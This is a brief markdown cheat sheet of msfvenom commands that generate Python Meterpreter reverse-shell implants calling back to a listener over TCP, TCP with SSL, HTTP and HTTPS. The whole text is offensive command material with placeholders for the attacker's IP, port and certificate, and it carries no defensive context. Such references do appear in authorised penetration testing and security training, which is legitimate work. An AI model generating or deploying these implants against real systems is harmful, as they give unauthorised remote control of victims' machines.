# Reverse Shells

## TCP

```
$ msfvenom -p python/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -o implant.py

$ msfvenom -p python/meterpreter/reverse_tcp_ssl lhost=<IP> lport=<PORT> -o implant.py
```

## HTTP

```
$ msfvenom -p python/meterpreter/reverse_http lhost=<IP> lport=<PORT> -o implant.py
```

## HTTP via TLS

```
$ msfvenom -p python/meterpreter/reverse_https handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -o implant.py
```